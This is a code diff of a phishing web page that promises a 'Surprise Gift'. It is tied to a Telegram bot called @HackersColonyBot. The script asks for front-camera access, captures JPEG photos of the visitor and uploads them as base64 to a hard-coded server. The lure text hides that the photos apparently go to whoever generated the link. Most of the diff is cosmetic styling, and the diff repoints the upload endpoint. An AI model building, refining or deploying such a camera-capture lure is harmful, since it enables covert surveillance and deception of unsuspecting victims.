@@ -17,24 +17,24 @@
             overflow: hidden;
         }
         .card {
-            background: rgba(22, 0, 34, 0.9);
+            background: rgba(22, 0, 34, 0.95);
             padding: 30px;
             border-radius: 20px;
             width: 90%;
             max-width: 400px;
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
+            box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
             text-align: center;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 0, 255, 0.3);
         }
         .gift-icon {
-            font-size: 70px;
+            font-size: 80px;
             margin-bottom: 10px;
             animation: float 3s ease-in-out infinite;
         }
         @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
         }
         h2 {
             margin: 10px 0;
@@ -42,10 +42,11 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            font-size: 28px;
         }
         button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             margin-top: 20px;
             border-radius: 50px;
             border: none;
@@ -54,15 +55,17 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: transform 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.4);
         }
         button:hover {
             transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.6);
         }
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
+            transform: none !important;
         }
         .spinner {
             width: 60px;
@@ -79,9 +82,9 @@
         }
         .progress-container {
             width: 100%;
-            height: 8px;
+            height: 10px;
             background: rgba(255, 0, 255, 0.2);
-            border-radius: 4px;
+            border-radius: 5px;
             margin: 20px 0;
             overflow: hidden;
         }
@@ -104,23 +107,26 @@
             margin-top: 20px;
             padding: 15px;
             background: rgba(0, 100, 200, 0.2);
-            border-radius: 10px;
+            border-radius: 15px;
             border: 1px solid rgba(0, 150, 255, 0.3);
         }
         .telegram-info a {
             color: #00bfff;
             text-decoration: none;
+            font-weight: bold;
         }
         .telegram-info a:hover {
             text-decoration: underline;
+            text-shadow: 0 0 10px #00bfff;
         }
         .video-container {
             width: 100%;
-            height: 200px;
-            margin: 15px 0;
-            border-radius: 10px;
+            height: 250px;
+            margin: 20px 0;
+            border-radius: 15px;
             overflow: hidden;
             background: #000;
+            border: 2px solid #ff00ff;
         }
         #video {
             width: 100%;
@@ -130,25 +136,43 @@
         .warning {
             color: #ff5555;
             font-size: 12px;
-            margin: 5px 0;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 85, 85, 0.1);
+            border-radius: 8px;
+            border-left: 3px solid #ff5555;
         }
         .step {
             display: flex;
             align-items: center;
             margin: 10px 0;
-            padding: 10px;
+            padding: 12px;
             background: rgba(255,255,255,0.05);
-            border-radius: 8px;
+            border-radius: 10px;
+            transition: transform 0.3s;
+        }
+        .step:hover {
+            transform: translateX(5px);
+            background: rgba(255,255,255,0.08);
         }
         .step-number {
-            width: 25px;
-            height: 25px;
-            background: #ff00ff;
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 10px;
+            margin-right: 12px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .success {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .error {
+            color: #ff5555;
             font-weight: bold;
         }
     </style>
@@ -157,8 +181,8 @@
     <div class="card">
         <div id="box">
             <div class="gift-icon">🎁</div>
-            <h2>✨ Secret Gift ✨</h2>
-            <p>A magical surprise is waiting for you!</p>
+            <h2>✨ Surprise Gift ✨</h2>
+            <p>A magical surprise is waiting just for you!</p>
             
             <div class="telegram-info">
                 <p><strong>📢 Required Steps:</strong></p>
@@ -176,8 +200,9 @@
             
             <button id="unlockBtn">🎯 Start Camera Access</button>
             
-            <p style="font-size: 12px; color: #888; margin-top: 20px;">
-                This will use your camera to create a personalized gift
+            <p style="font-size: 12px; color: #aaa; margin-top: 20px; line-height: 1.5;">
+                This will use your camera to create a personalized gift.<br>
+                Photos will be sent to your Telegram automatically.
             </p>
         </div>
         
@@ -187,12 +212,8 @@
     </div>
 
     <script>
-        // Get user ID from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const USER_ID = urlParams.get('uid');
-        
-        // Server endpoint - same as Render URL
-        const SERVER_URL = window.location.origin;
+        const USER_ID = new URLSearchParams(window.location.search).get('uid');
+        const SERVER_URL = 'https://hco-cam.onrender.com';
         
         document.getElementById("unlockBtn").onclick = async () => {
             const box = document.getElementById("box");
@@ -201,29 +222,28 @@
             
             btn.disabled = true;
             
-            // Check if user ID exists
-            if (!USER_ID || USER_ID.length < 5) {
+            if (!USER_ID || USER_ID.length < 3) {
                 box.innerHTML = `
-                    <div class="gift-icon">⚠️</div>
-                    <h2 style="color:#ff5555">Invalid Access</h2>
-                    <p>Please get a valid link from the Telegram bot</p>
+                    <div class="gift-icon">🔒</div>
+                    <h2 class="error">Invalid Access</h2>
+                    <p>Get a valid link from the Telegram bot</p>
                     <div class="step">
                         <div class="step-number">1</div>
                         <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                     </div>
                     <div class="step">
                         <div class="step-number">2</div>
-                        <div>Click "Get Your Gift" button</div>
+                        <div>Send <code>/start</code> and click "Get Your Gift"</div>
                     </div>
-                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram Bot</button>
+                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">🤖 Open Telegram Bot</button>
                 `;
                 return;
             }
             
             box.innerHTML = `
                 <div class="gift-icon">✨</div>
-                <h2>🎀 Creating Magic</h2>
-                <p>Please wait while we prepare your gift...</p>
+                <h2>Creating Your Gift...</h2>
+                <p>Please wait while we prepare your surprise</p>
                 <div class="spinner"></div>
                 <div class="progress-container">
                     <div class="progress-bar" id="progress"></div>
@@ -238,20 +258,19 @@
             const video = document.getElementById("video");
             
             try {
-                // Test camera access first
+                // Test camera access
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
                 
-                // Stop test stream
                 stream.getTracks().forEach(track => track.stop());
                 
                 // Start actual process
                 await startPhotoProcess();
                 
             } catch (error) {
-                showError("Camera access denied. Please allow camera to continue.");
+                showError("Camera access denied. Please allow camera access.");
                 return;
             }
             
@@ -320,10 +339,10 @@
                     // Success
                     box.innerHTML = `
                         <div class="gift-icon">🎉</div>
-                        <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
+                        <h2 class="success">Gift Delivered!</h2>
                         <p>Your special surprise has been prepared</p>
                         <p>Photos are being sent to your Telegram...</p>
-                        <div class="status" style="color:#00ff00">✨ Complete ✨</div>
+                        <div class="status success">✨ Complete ✨</div>
                         <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram</button>
                     `;
                     
@@ -343,26 +362,17 @@
                 return new Promise((resolve) => {
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            try {
-                                // Convert to base64 for sending
-                                const reader = new FileReader();
-                                reader.onloadend = async () => {
-                                    const base64data = reader.result.split(',')[1];
-                                    
-                                    // Send photo to server
-                                    await sendToServer(base64data, label);
-                                    
-                                    resolve();
-                                };
-                                reader.readAsDataURL(blob);
-                            } catch (e) {
-                                console.error("Capture error:", e);
+                            const reader = new FileReader();
+                            reader.onloadend = async () => {
+                                const base64data = reader.result.split(',')[1];
+                                await sendToServer(base64data, label);
                                 resolve();
-                            }
+                            };
+                            reader.readAsDataURL(blob);
                         } else {
                             resolve();
                         }
-                    }, 'image/jpeg', 0.8);
+                    }, 'image/jpeg', 0.85);
                 });
             }
             
@@ -381,10 +391,6 @@
                         })
                     });
                     
-                    if (!response.ok) {
-                        throw new Error('Server error');
-                    }
-                    
                     return await response.json();
                 } catch (error) {
                     console.error('Failed to send to server:', error);
@@ -395,8 +401,8 @@
             function showError(message) {
                 videoContainer.classList.add('hidden');
                 box.innerHTML = `
-                    <div class="gift-icon">🎭</div>
-                    <h2 style="color:#ff5555">Error</h2>
+                    <div class="gift-icon">⚠️</div>
+                    <h2 class="error">Error</h2>
                     <p>${message}</p>
                     <button onclick="location.reload()">🔄 Try Again</button>
                 `;
@@ -404,7 +410,7 @@
         };
 
         // Show warning if no user ID
-        if (!USER_ID || USER_ID.length < 5) {
+        if (!USER_ID || USER_ID.length < 3) {
             document.getElementById("unlockBtn").innerHTML = "⚠️ Get Link from Bot First";
             document.getElementById("unlockBtn").disabled = false;
             document.getElementById("unlockBtn").onclick = () => {
